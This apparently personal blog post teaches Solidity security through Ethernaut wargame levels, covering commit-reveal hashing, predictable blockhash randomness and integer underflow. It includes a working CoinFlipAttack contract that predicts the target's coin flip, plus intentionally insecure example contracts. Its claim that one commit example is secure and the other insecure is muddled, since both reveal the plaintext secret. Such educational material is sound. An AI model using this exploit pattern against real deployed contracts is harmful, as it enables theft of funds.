---
title: Think Solidity with Sense of Security
date: 2026-01-19 11:39:47
updated: 2026-03-01 18:31:52
categories:
  - [Solidity]
  - [Web3]
---

# Never show secret on chain

Remember always show the hashed secret on chain!

<!-- more -->

This code is secure because `commit` is stored in hash instead of plaintext.

```js
bytes32 public commit;

function commitHash(bytes32 h) external {
    commit = h;
}

function reveal(string calldata secret) external {
    require(
        keccak256(abi.encodePacked(secret)) == commit,
        "wrong secret"
    );
}
```

Let’s take a look at the insecure code ⚠️.

Attackers can monitor the mempool to obtain the plaintext `secret`, allowing them to front-run the transaction in the same block or a subsequent block.

```js
contract BadCommit {
    bytes32 public commit;

    function setSecret(string calldata secret) external {
        commit = keccak256(abi.encodePacked(secret));
    }

    function authenticate(string calldata secret) external {
        require(
            keccak256(abi.encodePacked(secret)) == commit,
            "wrong"
        );
    }
}
```

# Generate random value in Solidity?

## Intro

> Using on-chain variables like **blockhash**/**block.timestamp** as a source of randomness is `insecure`, because an attacker could synchronously compute the same result on-chain with the same input.

To understand this, try to do the flip coin game on [https://ethernaut.openzeppelin.com/level/0xA62fE5344FE62AdC1F356447B669E9E6D10abaaF](https://ethernaut.openzeppelin.com/level/0xA62fE5344FE62AdC1F356447B669E9E6D10abaaF)

When this contract is deployed, for example, the deployment address is: *0x0ff691A7e70ae5b7f4eBeE176959f775b7E9Fa6f*.

Use the following code to attack the smart contract:

```js

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttack {

    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    ICoinFlip public target;

    constructor(ICoinFlip _target) {
        target = _target;
    }

    function attack() external returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1;

        return target.flip(side);
    }

}
```

Key point: when you call attack(), both your attack contract and the target contract `are executed within the same block context` (i.e., the same transaction execution environment).

* block.number has the same value for both contracts
* blockhash(block.number - 1) therefore resolves to the same hash

As a result, the side value you compute is guaranteed to be identical to the value computed internally by the target contract. It is deterministically computing the same result at the same time.

---

The reason for not having a natural random value in Solidity `is that the Blockchain is a deterministic system`. All nodes must calculate the same output. Otherwise, the chain would be forked, consensus would collapse!

There are 3 ways for random value is recognised in the Solidity world:

1. Chainlink VRF (Verifiable Random Function)
2. Commit-Reveal
3. Multi-party Randomness

# Be extremely careful with overflow!

Check this question first: [https://ethernaut.openzeppelin.com/level/0x478f3476358Eb166Cb7adE4666d04fbdDB56C407](https://ethernaut.openzeppelin.com/level/0x478f3476358Eb166Cb7adE4666d04fbdDB56C407)

Before Solidity 8.0, there was no auto-check for unsigned integers, so `overflow` happened. In this case, if I make the transfer value equal to 21. 20-21=2^256-1 (horrible number!!!!).

As a result, **SafeMath** lib is used before the version of Solidity 8.0. Example code:

```js
using SafeMath for uint256;
balance = balance.sub(amount);
```
